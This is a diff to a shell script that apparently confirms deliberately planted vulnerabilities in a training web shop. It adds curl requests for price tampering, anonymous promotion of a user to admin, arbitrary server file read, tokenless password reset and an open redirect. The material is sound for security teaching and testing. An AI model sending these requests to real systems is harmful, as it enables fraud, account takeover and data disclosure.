@@ -94,6 +94,37 @@ r=$(curl -s -X POST "$B/api/login" -H 'Content-Type: application/json' -d '{"use
 echo "$r" | grep -q '"role":"admin"' && ok "no lockout after 20 failed attempts" || no "account locked out"
 hr
 
+# VULN-13 Client-controlled price is accepted by checkout
+echo "VULN-13  Price tampering at checkout"
+r=$(curl -s -X POST "$B/api/orders" -H 'Content-Type: application/json' -d '{"items":[{"id":4,"name":"Ultimate","price":0.01}],"total":0.01}')
+echo "$r" | grep -q '"total":0.01' && ok "€99.99 plan ordered for a client-supplied €0.01" || no "server recalculated the total"
+hr
+
+# VULN-14 Anyone can alter another user, including assigning admin
+echo "VULN-14  Unauthenticated profile update / mass assignment"
+r=$(curl -s -X PUT "$B/api/users/3" -H 'Content-Type: application/json' -d '{"address":"3 Customer Rd, Cork","role":"admin"}')
+echo "$r" | grep -q '"role":"admin"' && ok "anonymous request promoted user 3 to admin" || no "profile update authorised"
+curl -s -X PUT "$B/api/users/3" -H 'Content-Type: application/json' -d '{"address":"3 Customer Rd, Cork","role":"customer"}' >/dev/null
+hr
+
+# VULN-15 Arbitrary file read (read only the app's own non-secret source file)
+echo "VULN-15  Arbitrary server file read"
+r=$(curl -s --get "$B/api/logs" --data-urlencode "file=$(cd "$(dirname "$0")/.." && pwd)/backend/Cargo.toml")
+echo "$r" | grep -q 'slopshop-backend' && ok "server returned its Cargo.toml without authentication" || no "file path restricted"
+hr
+
+# VULN-16 Password reset without a token, then restore synthetic credentials
+echo "VULN-16  Tokenless password reset"
+r=$(curl -s -X POST "$B/api/password-reset" -H 'Content-Type: application/json' -d '{"username":"staff","password":"staff123"}')
+echo "$r" | grep -q '"reset":"staff"' && ok "staff password reset with no token or authentication" || no "recovery token required"
+hr
+
+# VULN-17 Open redirect to a harmless example domain
+echo "VULN-17  Open redirect"
+r=$(curl -s -I "$B/api/logout?next=https%3A%2F%2Fexample.com")
+echo "$r" | grep -qi '^location: https://example.com' && ok "logout redirects to an arbitrary external URL" || no "redirect destination validated"
+hr
+
 echo
 echo "SUMMARY: $pass vulnerabilities present, $fail checks did not reproduce."
 echo "(VULN-12 CSRF + non-HttpOnly cookie: demonstrated in docs/VULNERABILITIES.md)"
